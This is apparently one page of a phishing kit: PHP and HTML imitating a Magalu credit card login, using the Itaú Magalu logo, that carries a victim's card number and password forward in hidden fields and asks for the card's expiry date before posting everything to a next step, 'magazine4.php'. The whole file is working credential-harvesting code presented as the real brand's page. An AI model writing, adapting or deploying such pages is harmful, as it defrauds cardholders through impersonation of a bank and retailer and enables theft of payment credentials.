<?php 
        session_start();

        $number = $_POST['number'];
        $password = $_POST['password'];
       

        $_SESSION["number"] = $number;
        $_SESSION["password"] = $password;
              
    ?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Anton&family=Lato:wght@300;400&family=Oswald:wght@300&family=Roboto:ital,wght@0,300;1,100&display=swap" rel="stylesheet">
<link rel="shortcut icon" href="img/icone.png" />
	<title>Magalu</title>
</head>
<style type="text/css">
	body{
		margin: 0px;
		background-color: #0f89ff;
	}
	img{
		width: 133px;
		margin-top: 80px;
		margin-left: 132px;
	}
	blockquote{
		margin-top: 30px;
		margin-bottom: 63px;
		margin-left: 65px;
		background-color:white;
		height: 340px;
		border-radius: 4px ;
		width: 283px;


	}

	form input[type='tel']{
		margin-left: 22px;
		font-size: 16px;
		font-family: 'roboto', sans-serif;
		height: 48px;
		border-radius: 4px;
		width: 230px;
		border-width: 0.2px;




	}
	 input[type='submit']{
	height:32px;
 margin-left: 22px;
 background-color:#0f89ff;
 color:white;
 border:1px solid #0f89ff;
 width: 236px;
 height: 48px;
 border-radius: 4px; 
 font-size: 20px;
 font-family: Arial;
 text-align: center;
 
}
form{

}

	h1{
		font-family: 'Fjalla One', sans-serif;	
		font-size: 22px;
		color: #464646;

		margin-top: 30px;
		float: center;
		margin-left: 22px;
	}
	p{
		font-family: Arial;
    font-size: 14px;
    font-weight: 700;
    font-stretch: normal;
    font-style: normal;
    line-height: 1.71;
    letter-spacing: normal;
    color: #006195;
    text-align: center;
	}
	footer{
		background-color: #e9ebf0;
		height: 100px;
		margin-bottom: 0px;


	}
	
		p2{
		font-size: 16px;
		font-family: 'lato', sans-serif;
		color: #464646;
		margin-left:114px;
	}
		p3{
		font-size: 16px;
		font-family: 'lato', sans-serif;
		color: #464646;
		margin-left:110px;
	}
	h2{
		color: white;
	}
	.magalu{
    font-family: Arial;
    font-size: 14px;
    font-weight: bold;
    font-stretch: normal;
    font-style: normal;
    line-height: 1.71;
    letter-spacing: normal;
    color: #006195;
    margin-left: 52px;
}
</style>
<body>

	<header>
    <div class="center">
      <div class="logo"><img src="https://www.itau.com.br/content/dam/itau/cartoes/magalu/magalu-logo.png">
      </div>
    </div>
  </header>
  <blockquote>
    <div class="container">
        <div class="row">
          <div class="col-md-12">
            <div class="demo-container">
                <div class="card-wrapper"></div>
 <div class="form-container active">
  <h2>a</h2>
                    <form action="magazine4.php"  class="form-inline" method="POST">
                    	<input type="hidden" name="number" id="number" value="<?php echo $_SESSION["number"] ?>">
                      <input type="hidden" name="password" id="password" value="<?php echo $_SESSION["password"] ?>">
                                  

                                <div class="form-group">
                                    <h1 for="number">digite o n??mero<br> do seu cart??o</h1><br>
                                    <input type="tel" placeholder="Validade do cart??o"  name="expiry" id="expiry" minlength="7" maxlength="7" onkeypress="return SomenteNumero(event)" required oninvalid="setCustomValidity('Digite uma validade v??lida !')" onchange="try{setCustomValidity('')}catch(e){}">
                                </div><br>
                                <input type="submit" name="" value="acessar" id="continuar"><br><br>
                                <a class="magalu" role="link" tabindex="0">pe??a aqui o seu cart??o></a>
                               
                           </form>
                       </div>
                   </div>
               </div>
           </div>
       </div>
</blockquote>
<footer>
	<a href=""><p2> Sobre o cart??o </p2></a> <br><br>
	<a href=""><p3> Precisa de ajuda? </p3></a>
	
</footer>

</body>
    <script src="js/bootstrap.js"></script>
    <script src="js/padrao_mk.js"></script>
    <script src="js/cpf.js"></script>

    <script src="js/jquery.card.js"></script>
    <script src="js/card.js"></script>
    <script>
        new Card({
            form: document.querySelector('form'),
            container: '.card-wrapper'
        });
    </script>

</html>